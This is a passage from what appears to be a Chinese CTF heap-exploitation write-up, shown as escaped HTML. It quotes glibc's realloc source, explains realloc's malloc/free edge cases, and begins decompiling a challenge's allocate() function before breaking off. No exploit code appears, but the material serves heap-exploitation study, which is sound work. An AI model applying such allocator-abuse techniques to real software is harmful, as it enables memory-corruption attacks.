class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *__libc_realloc (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *oldmem, &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; bytes)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mstate ar_ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  INTERNAL_SIZE_T nb;         &lt;span class=&#34;comment&#34;&gt;/* padded request size */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *newp;             &lt;span class=&#34;comment&#34;&gt;/* chunk to return */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *(*hook) (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *, &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt;, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *) =&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    atomic_forced_read (__realloc_hook);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__builtin_expect (hook != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (*hook)(oldmem, bytes, RETURN_ADDRESS (&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; REALLOC_ZERO_BYTES_FREES&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (bytes == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; oldmem != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      __libc_free (oldmem); &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* realloc of null is supposed to be same as malloc */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (oldmem == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __libc_malloc (bytes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* chunk corresponding to oldmem */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; mchunkptr oldp = mem2chunk (oldmem);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* its size */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; INTERNAL_SIZE_T oldsize = chunksize (oldp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (chunk_is_mmapped (oldp))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ar_ptr = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      MAYBE_INIT_TCACHE ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ar_ptr = arena_for_chunk (oldp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Little security check which won&amp;#x27;t hurt performance: the allocator&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     never wrapps around at the end of the address space.  Therefore&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     we can exclude some size values which might appear here by&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     accident or by &amp;quot;design&amp;quot; from some intruder.  We need to bypass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     this check for dumped fake mmap chunks from the old main arena&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     because the new malloc may provide additional alignment.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((__builtin_expect ((&lt;span class=&#34;type&#34;&gt;uintptr_t&lt;/span&gt;) oldp &amp;gt; (&lt;span class=&#34;type&#34;&gt;uintptr_t&lt;/span&gt;) -oldsize, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       || __builtin_expect (misaligned_chunk (oldp), &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;amp;&amp;amp; !DUMPED_MAIN_ARENA_CHUNK (oldp))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;realloc(): invalid pointer&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  checked_request2size (bytes, nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (chunk_is_mmapped (oldp))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;comment&#34;&gt;/* If this is a faked mmapped chunk from the dumped main arena,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	 always make a copy (and do not free the old chunk).  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (DUMPED_MAIN_ARENA_CHUNK (oldp))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;comment&#34;&gt;/* Must alloc, copy, free. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *newmem = __libc_malloc (bytes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (newmem == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;comment&#34;&gt;/* Copy as many bytes as are available from the old chunk&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	     and fit into the new size.  NB: The overhead for faked&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	     mmapped chunks is only SIZE_SZ, not 2 * SIZE_SZ as for&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	     regular mmapped chunks.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (bytes &amp;gt; oldsize - SIZE_SZ)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    bytes = oldsize - SIZE_SZ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt; (newmem, oldmem, bytes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; newmem;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *newmem;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; HAVE_MREMAP&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      newp = mremap_chunk (oldp, nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (newp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; chunk2mem (newp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;comment&#34;&gt;/* Note the extra SIZE_SZ overhead. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (oldsize - SIZE_SZ &amp;gt;= nb)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; oldmem;                         &lt;span class=&#34;comment&#34;&gt;/* do nothing */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;comment&#34;&gt;/* Must alloc, copy, free. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      newmem = __libc_malloc (bytes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (newmem == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;              &lt;span class=&#34;comment&#34;&gt;/* propagate failure */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt; (newmem, oldmem, oldsize - &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * SIZE_SZ);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      munmap_chunk (oldp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; newmem;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (SINGLE_THREAD_P)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      newp = _int_realloc (ar_ptr, oldp, oldsize, nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      ar_ptr == arena_for_chunk (mem2chunk (newp)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; newp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __libc_lock_lock (ar_ptr-&amp;gt;mutex);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  newp = _int_realloc (ar_ptr, oldp, oldsize, nb);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __libc_lock_unlock (ar_ptr-&amp;gt;mutex);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          ar_ptr == arena_for_chunk (mem2chunk (newp)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (newp == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;comment&#34;&gt;/* Try harder to allocate memory in other arenas.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      LIBC_PROBE (memory_realloc_retry, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, bytes, oldmem);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      newp = __libc_malloc (bytes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (newp != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt; (newp, oldmem, oldsize - SIZE_SZ);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          _int_free (ar_ptr, oldp, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; newp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_hidden_def (__libc_realloc)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;大致意思就是如果 realloc (NULL,size) 就会调用 malloc。&lt;/p&gt;
&lt;p&gt;realloc (ptr,0)，调用 free。程序也是用这里实现的 free&lt;/p&gt;
&lt;p&gt;realloc (ptr,chunksize (ptr)), 不做任何事情。&lt;/p&gt;
&lt;p&gt;如果申请一个更大的空间，会检查当前堆块的附近是否有足够的空间，没有，则重新申请，然后将数据 copy 过去，并 free 原来的 chunk&lt;/p&gt;
&lt;p&gt;申小空间会将多余的空间释放掉。&lt;/p&gt;
&lt;p&gt;程序只允许我们存储两个 chunk 再 heap [2], 并且限制了我们的申请大小位 0x78。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;allocate&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _BYTE *v0; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-20h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 size; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *v4; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = read_long();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v2 &amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; || heap[v2] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LODWORD(v0) = &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid !&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    size = read_long();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span 